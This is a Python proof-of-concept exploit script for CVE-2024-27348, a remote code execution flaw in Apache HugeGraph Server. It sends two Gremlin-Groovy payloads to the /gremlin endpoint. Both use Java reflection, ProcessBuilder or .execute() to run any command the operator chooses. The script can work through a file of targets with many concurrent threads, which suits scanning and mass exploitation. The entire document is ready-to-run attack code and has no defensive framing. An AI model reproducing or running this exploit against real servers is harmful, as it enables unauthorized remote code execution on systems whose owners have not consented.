import requests
import argparse
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

def exploit(session, target, command):
    url = f"http://{target}:8080/gremlin"
    headers = {
        "Content-Type": "application/json"
    }
    payload1 = {
        "gremlin": f"Thread thread = Thread.currentThread();Class clz = Class.forName(\"java.lang.Thread\");java.lang.reflect.Field field = clz.getDeclaredField(\"name\");field.setAccessible(true);field.set(thread, \"SL7\");Class processBuilderClass = Class.forName(\"java.lang.ProcessBuilder\");java.util.List command = java.util.Arrays.asList(\"{command}\");Object processBuilderInstance = processBuilderClass.getConstructor(java.util.List.class).newInstance(command);processBuilderClass.getMethod(\"start\").invoke(processBuilderInstance);",
        "bindings": {},
        "language": "gremlin-groovy",
        "aliases": {}
    }
    
    payload2 = {
        "gremlin": f"def result = \"{command}\".execute().text\njava.lang.reflect.Field field = Thread.currentThread().getClass().getDeclaredField(result);",
    }
    
    try:
        response = session.post(url, headers=headers, data=json.dumps(payload1), timeout=5)
        if response.status_code in {200, 500} and "\"code\":200" in response.text:
            print(f"[+] {target}: Command executed successfully with payload 1")
        else:
            response = session.post(url, headers=headers, data=json.dumps(payload2), timeout=5)
            if response.status_code in {200, 500} and "\"code\":200" in response.text:
                print(f"[+] {target}: Command executed successfully with payload 2")
            else:
                print(f"[-] {target}: Request failed with status code {response.status_code}")
    except Exception as e:
        print(f"[-] {target}: Exception occurred - {e}")


def process_targets(file, command, max_threads=10):
    with open(file, 'r') as f:
        targets = [line.strip() for line in f]
    
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        with requests.Session() as session:
            futures = [executor.submit(exploit, session, target, command) for target in targets]
            for future in as_completed(futures):
                future.result()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Proof of Concept exploit for CVE-2024-27348 Remote Code Execution in Apache HugeGraph Server")
    parser.add_argument("-c", "--command", required=True, help="Command to execute on target")
    parser.add_argument("-f", "--file", required=False, help="Import targets from a file")
    parser.add_argument("-t", "--target", required=False, help="Target Domain/IP")
    parser.add_argument("--threads", type=int, default=10, help="Number of concurrent threads (default: 10)")
    args = parser.parse_args()

    if args.file:
        process_targets(args.file, args.command, args.threads)
    elif args.target:
        with requests.Session() as session:
            exploit(session, args.target, args.command)
    else:
        print("Specify target with -t/--target or import targets from a file using -f/--file")
